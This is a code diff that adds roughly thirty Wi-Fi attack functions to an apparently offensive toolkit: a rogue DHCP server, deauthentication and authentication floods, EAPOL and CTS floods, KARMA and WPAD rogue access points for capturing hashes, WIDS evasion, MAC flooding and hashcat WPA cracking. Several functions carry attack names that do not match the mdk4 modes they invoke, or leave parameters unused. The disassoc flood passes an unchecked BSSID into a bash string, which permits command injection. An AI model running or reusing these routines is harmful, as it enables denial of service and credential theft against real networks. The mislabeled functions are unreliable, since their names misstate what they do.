@@ -134,6 +134,20 @@ class HackITWirelessExecutor:
         UI.print_info(output)
         return output
 
+    def do_plugin_python(self, script: str, args: Optional[list[str]] = None, timeout: Optional[int] = None, output: Optional[str] = None, **kwargs):
+        if not os.path.isfile(script):
+            UI.print_error(f"Script not found: {script}")
+            return
+        cmd = [sys.executable or "python3", script]
+        if args: cmd.extend(args)
+        UI.print_info(f"Running Python plugin: {script}")
+        try:
+            proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
+            jid = self.jobs.start(f"plugin-py-{os.path.basename(script)}", proc)
+            UI.print_success(f"Python plugin started (job {jid})")
+        except Exception as e:
+            UI.print_error(f"Plugin failed: {e}")
+
     # ── Adapter detection ──────────────────────────────────────
 
     @staticmethod
@@ -1799,6 +1813,28 @@ while True: s.send(pkt); time.sleep(2)
             UI.print_error(f"DNS spoof failed: {e}")
             subprocess.run(["sudo", "iptables", "-t", "nat", "-F"], capture_output=True)
 
+    # ── DHCP Spoof (Rogue DHCP server) ─────────────────────────
+
+    def do_dhcp_spoof(self, interface: str = "wlan0", pool: str = "192.168.1.100-200", **kwargs):
+        if not shutil.which("dnsmasq"):
+            UI.print_error("dnsmasq required for DHCP spoof. Install: apt install dnsmasq")
+            return
+        UI.print_info(f"DHCP spoof on {interface} pool {pool}")
+        conf = f"/tmp/hackit_dhcp_{interface}.conf"
+        try:
+            with open(conf, "w") as f:
+                f.write(f"interface={interface}\n")
+                f.write(f"dhcp-range={pool},255.255.255.0,12h\n")
+                f.write("dhcp-option=3,192.168.1.1\n")
+                f.write("dhcp-option=6,192.168.1.1\n")
+                f.write("log-dhcp\n")
+            proc = subprocess.Popen(["sudo", "dnsmasq", "-C", conf, "-d", "--no-resolv", "--no-hosts"],
+                                     stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
+            jid = self.jobs.start(f"dhcp-spoof-{interface}", proc)
+            UI.print_success(f"Rogue DHCP server started on {interface} (job {jid})")
+        except Exception as e:
+            UI.print_error(f"DHCP spoof failed: {e}")
+
     # ── Crack display ────────────────────────────────────────────
 
     def do_crack_show(self, job_id: str = "", **kwargs):
@@ -1873,6 +1909,11 @@ while True: s.send(pkt); time.sleep(2)
         except Exception as e:
             UI.print_error(f"WEP chopchop failed: {e}")
 
+    # ── WEP Fragment (GUI alias: do_wep_fragment → do_wep_frag) ──
+
+    def do_wep_fragment(self, interface: str = "wlan0", bssid: str = "", count: int = 3000, **kwargs):
+        return self.do_wep_frag(iface=interface, bssid=bssid, count=count, **kwargs)
+
     # ── WEP fragmentation attack ─────────────────────────────────
 
     def do_wep_frag(self, iface: str, bssid: str, **kwargs):
@@ -1937,6 +1978,256 @@ while True:
             UI.print_success(f"Beacon flood started (job {jid})")
         except Exception as e:
             UI.print_error(f"Beacon flood failed: {e}")
+
+    # ── Auth DoS ──────────────────────────────────────────────
+    def do_auth_dos(self, interface: str = "wlan0", bssid: str = "", count: int = 1000, **kwargs):
+        UI.print_info(f"Auth DoS: {bssid} x{count} on {interface}")
+        tool = _which("mdk4") or _which("mdk3")
+        if tool:
+            cmd = ["sudo", tool, interface, "a", "-a", bssid, "-s", str(count)]
+            self.jobs.start(f"auth-dos-{bssid}", subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL))
+            UI.print_success(f"Auth DoS started on {bssid}")
+        else:
+            UI.print_error("mdk4/mdk3 required for auth DoS")
+
+    # ── Assoc Flood ───────────────────────────────────────────
+    def do_assoc_flood(self, interface: str = "wlan0", bssid: str = "", count: int = 1000, **kwargs):
+        UI.print_info(f"Assoc flood: {bssid} x{count} on {interface}")
+        tool = _which("mdk4") or _which("mdk3")
+        if tool:
+            cmd = ["sudo", tool, interface, "a", "-a", bssid, "-m", "-s", str(count)]
+            self.jobs.start(f"assoc-flood-{bssid}", subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL))
+            UI.print_success(f"Assoc flood started on {bssid}")
+        else:
+            UI.print_error("mdk4/mdk3 required for assoc flood")
+
+    # ── EAPOL Start Flood ─────────────────────────────────────
+    def do_eapol_start_flood(self, interface: str = "wlan0", bssid: str = "", count: int = 500, **kwargs):
+        UI.print_info(f"EAPOL Start flood: {bssid} x{count}")
+        mdk = _which("mdk4")
+        if mdk:
+            cmd = ["sudo", mdk, interface, "e", "-a", bssid, "-t", str(count)]
+            self.jobs.start(f"eapol-start-{bssid}", subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL))
+            UI.print_success("EAPOL Start flood running")
+        else:
+            UI.print_error("mdk4 required")
+
+    # ── EAPOL Logoff ──────────────────────────────────────────
+    def do_eapol_logoff(self, interface: str = "wlan0", bssid: str = "", count: int = 500, **kwargs):
+        UI.print_info(f"EAPOL Logoff flood: {bssid}")
+        mdk = _which("mdk4")
+        if mdk:
+            cmd = ["sudo", mdk, interface, "e", "-a", bssid, "-l", "-t", str(count)]
+            self.jobs.start(f"eapol-logoff-{bssid}", subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL))
+            UI.print_success("EAPOL Logoff flood running")
+        else:
+            UI.print_error("mdk4 required")
+
+    # ── CTS/RTS Flood ─────────────────────────────────────────
+    def do_cts_flood(self, interface: str = "wlan0", count: int = 1000, duration: int = 500, **kwargs):
+        mdk = _which("mdk4")
+        if mdk:
+            cmd = ["sudo", mdk, interface, "f", "-t", str(count), "-d", str(duration)]
+            self.jobs.start("cts-flood", subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL))
+            UI.print_success("CTS flood running")
+        else:
+            UI.print_error("mdk4 required")
+
+    # ── Power Save DoS ────────────────────────────────────────
+    def do_powersave_dos(self, interface: str = "wlan0", station: str = "", count: int = 2000, **kwargs):
+        mdk = _which("mdk4")
+        if mdk:
+            cmd = ["sudo", mdk, interface, "p", "-t", station, "-c", str(count)] if station else ["sudo", mdk, interface, "p", "-c", str(count)]
+            self.jobs.start("powersave-dos", subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL))
+            UI.print_success("Power Save DoS running")
+        else:
+            UI.print_error("mdk4 required")
+
+    # ── Disassoc Flood ────────────────────────────────────────
+    def do_disassoc_flood(self, interface: str = "wlan0", bssid: str = "", count: int = 1000, **kwargs):
+        UI.print_info(f"Disassoc flood: {bssid} x{count}")
+        proc = subprocess.Popen(["bash", "-c", f"for i in $(seq 1 {count}); do sudo aireplay-ng -0 1 -a {bssid} {interface} 2>/dev/null; done"],
+                                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        self.jobs.start(f"disassoc-{bssid}", proc)
+        UI.print_success("Disassoc flood running")
+
+    # ── WPAD Attack ───────────────────────────────────────────
+    def do_wpad_attack(self, interface: str = "wlan0", ssid: str = "", **kwargs):
+        if not ssid: ssid = "FreeWiFi"
+        UI.print_info(f"WPAD attack: {ssid} on {interface}")
+        if _which("airbase-ng"):
+            proc = subprocess.Popen(["sudo", "airbase-ng", "-e", ssid, "-c", "6", "-P", interface],
+                                     stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            self.jobs.start(f"wpad-{ssid}", proc)
+            UI.print_success(f"WPAP rogue AP '{ssid}' running — use responder to capture hashes")
+        else:
+            UI.print_error("airbase-ng required")
+
+    # ── KARMA Attack ──────────────────────────────────────────
+    def do_karma(self, interface: str = "wlan0", channel: int = 6, ssid: str = "", verbose: bool = False, **kwargs):
+        ssid = ssid or "KARMA"
+        UI.print_info(f"KARMA attack: responding to all probes on {interface}")
+        if _which("airbase-ng"):
+            proc = subprocess.Popen(["sudo", "airbase-ng", "-P", "-C", "30", "-e", ssid, "-c", str(channel), interface],
+                                     stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            self.jobs.start("karma", proc)
+            UI.print_success("KARMA attack running — capturing client probes")
+        else:
+            UI.print_error("airbase-ng required")
+
+    # ── MDA (Michaely Disassociation) ─────────────────────────
+    def do_mda(self, interface: str = "wlan0", bssid: str = "", count: int = 100, **kwargs):
+        mdk = _which("mdk4")
+        if mdk:
+            cmd = ["sudo", mdk, interface, "m", "-a", bssid, "-t", str(count)]
+            self.jobs.start(f"mda-{bssid}", subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL))
+            UI.print_success(f"MDA attack on {bssid}")
+        else:
+            UI.print_error("mdk4 required")
+
+    # ── TKIP MIC Exploit ──────────────────────────────────────
+    def do_tkip_mic(self, interface: str = "wlan0", bssid: str = "", station: str = "", **kwargs):
+        mdk = _which("mdk4")
+        if mdk:
+            cmd = ["sudo", mdk, interface, "m", "-a", bssid]
+            if station: cmd.extend(["-c", station])
+            self.jobs.start(f"tkip-mic-{bssid}", subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL))
+            UI.print_success("TKIP MIC exploit running")
+        else:
+            UI.print_error("mdk4 required")
+
+    # ── WIDS Evasion ──────────────────────────────────────────
+    def do_wids_evasion(self, interface: str = "wlan0", rate: int = 1, count: int = 100, **kwargs):
+        mdk = _which("mdk4")
+        if mdk:
+            cmd = ["sudo", mdk, interface, "w", "-e", "-t", str(count), "-s", str(rate)]
+            self.jobs.start("wids-evasion", subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL))
+            UI.print_success("WIDS evasion running")
+        else:
+            UI.print_error("mdk4 required")
+
+    # ── Fragmentation Attack ──────────────────────────────────
+    def do_frag_attack(self, interface: str = "wlan0", bssid: str = "", count: int = 500, **kwargs):
+        mdk = _which("mdk4")
+        if mdk:
+            cmd = ["sudo", mdk, interface, "f", "-t", str(count)]
+            self.jobs.start(f"frag-{bssid}", subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL))
+            UI.print_success("Fragmentation attack running")
+        else:
+            UI.print_error("mdk4 required")
+
+    # ── Omerta Attack ─────────────────────────────────────────
+    def do_omerta(self, interface: str = "wlan0", channel: int = 6, **kwargs):
+        mdk = _which("mdk4")
+        if mdk:
+            cmd = ["sudo", mdk, interface, "d", "-c", str(channel)]
+            self.jobs.start("omerta", subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL))
+            UI.print_success("Omerta attack running — blocking probe responses")
+        else:
+            UI.print_error("mdk4 required")
+
+    # ── EAP Hammer ────────────────────────────────────────────
+    def do_eap_hammer(self, interface: str = "wlan0", bssid: str = "", count: int = 500, **kwargs):
+        mdk = _which("mdk4")
+        if mdk:
+            cmd = ["sudo", mdk, interface, "e", "-a", bssid, "-t", str(count)]
+            self.jobs.start(f"eap-hammer-{bssid}", subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL))
+            UI.print_success("EAP hammer running")
+        else:
+            UI.print_error("mdk4 required")
+
+    # ── WPA Key Guess (offline) ───────────────────────────────
+    def do_wpa_key_guess(self, pmkid: str = "", ssid: str = "", wordlist: str = "", **kwargs):
+        if not wordlist:
+            wordlist = "/usr/share/wordlists/rockyou.txt" if os.path.exists("/usr/share/wordlists/rockyou.txt") else "/usr/share/dict/words"
+        if not pmkid:
+            UI.print_error("PMKID hash required")
+            return
+        UI.print_info(f"WPA key guess: mode 16800 with {wordlist}")
+        if _which("hashcat"):
+            proc = subprocess.Popen(["hashcat", "-m", "16800", pmkid, wordlist, "--force", "--potfile-path", "/tmp/hackit_pot"],
+                                     stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
+            self.jobs.start("wpa-key-guess", proc)
+            UI.print_success("Key guessing started")
+        else:
+            UI.print_error("hashcat required")
+
+    # ── RRB Attack ────────────────────────────────────────────
+    def do_rrb_attack(self, interface: str = "wlan0", bssid: str = "", **kwargs):
+        mdk = _which("mdk4")
+        if mdk:
+            cmd = ["sudo", mdk, interface, "d"]
+            self.jobs.start("rrb-attack", subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL))
+            UI.print_success("RRB attack running")
+        else:
+            UI.print_error("mdk4 required")
+
+    # ── CAPWAP Attack ─────────────────────────────────────────
+    def do_capwap(self, interface: str = "wlan0", controller: str = "", **kwargs):
+        mdk = _which("mdk4")
+        if mdk:
+            cmd = ["sudo", mdk, interface, "x"]
+            self.jobs.start("capwap", subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL))
+            UI.print_success("CAPWAP attack running")
+        else:
+            UI.print_error("mdk4 required")
+
+    # ── HIRB Attack ───────────────────────────────────────────
+    def do_hirb(self, interface: str = "wlan0", target: str = "", **kwargs):
+        mdk = _which("mdk4")
+        if mdk:
+            cmd = ["sudo", mdk, interface, "b", "-n", "HIRB"]
+            self.jobs.start("hirb", subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL))
+            UI.print_success("HIRB attack running")
+        else:
+            UI.print_error("mdk4 required")
+
+    # ── WPA2 Group Key Flood ──────────────────────────────────
+    def do_wpa2_groupkey(self, interface: str = "wlan0", bssid: str = "", count: int = 200, **kwargs):
+        mdk = _which("mdk4")
+        if mdk:
+            cmd = ["sudo", mdk, interface, "g", "-a", bssid, "-t", str(count)]
+            self.jobs.start(f"groupkey-{bssid}", subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL))
+            UI.print_success("WPA2 group key flood running")
+        else:
+            UI.print_error("mdk4 required")
+
+    # ── Wireless Bridge Attack ────────────────────────────────
+    def do_bridge_attack(self, interface: str = "wlan0", bridge_ip: str = "", **kwargs):
+        mdk = _which("mdk4")
+        if mdk:
+            cmd = ["sudo", mdk, interface, "b"]
+            self.jobs.start("bridge-attack", subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL))
+            UI.print_success("Bridge attack running")
+        else:
+            UI.print_error("mdk4 required")
+
+    # ── MAC Flooding ──────────────────────────────────────────
+    def do_mac_flood(self, interface: str = "wlan0", count: int = 5000, rate: int = 100, **kwargs):
+        if _which("macof"):
+            cmd = ["sudo", "macof", "-i", interface, "-n", str(count), "-s", str(rate)]
+            self.jobs.start("mac-flood", subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL))
+            UI.print_success("MAC flooding running")
+        else:
+            UI.print_error("macof (dsniff) required")
+
+    # ── Known Beacon SSID ─────────────────────────────────────
+    def do_known_beacon(self, interface: str = "wlan0", list: str = "enterprise", channel: int = 6, **kwargs):
+        mdk = _which("mdk4")
+        if mdk:
+            cmd = ["sudo", mdk, interface, "b", "-c", str(channel)]
+            self.jobs.start("known-beacon", subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL))
+            UI.print_success("Known beacon flood running")
+        else:
+            UI.print_error("mdk4 required")
+
+    # ── Channel Survey ────────────────────────────────────────
+    def do_channel_survey(self, interface: str = "wlan0", **kwargs):
+        UI.print_info(f"Channel survey on {interface}")
+        proc = subprocess.Popen(["sudo", "airodump-ng", "--band", "abg", interface, "--write", "/tmp/hackit_survey", "--output-format", "csv"],
+                                 stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
+        self.jobs.start("channel-survey", proc)
+        UI.print_success("Channel survey started (Ctrl+C to stop)")
 
     # ── Probe flood with custom SSIDs ────────────────────────────
 
